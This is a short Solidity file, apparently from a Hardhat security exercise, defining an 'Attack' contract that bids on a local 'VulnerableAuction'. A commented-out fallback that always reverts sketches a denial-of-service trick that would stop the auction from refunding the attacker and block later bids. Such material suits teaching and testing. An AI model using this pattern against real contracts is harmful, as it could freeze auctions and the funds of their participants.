pragma solidity >=0.6.0 <0.7.0;

import "hardhat/console.sol";

import "./VulnerableAuction.sol";

contract Attack {
  VulnerableAuction auction;

  constructor(VulnerableAuction _auction) public {
    auction = VulnerableAuction(_auction);
  }

  function attack() public payable {
    auction.bid{value: msg.value}();
  }

  // function () external payable {
  //     assert(false);
  // }
}
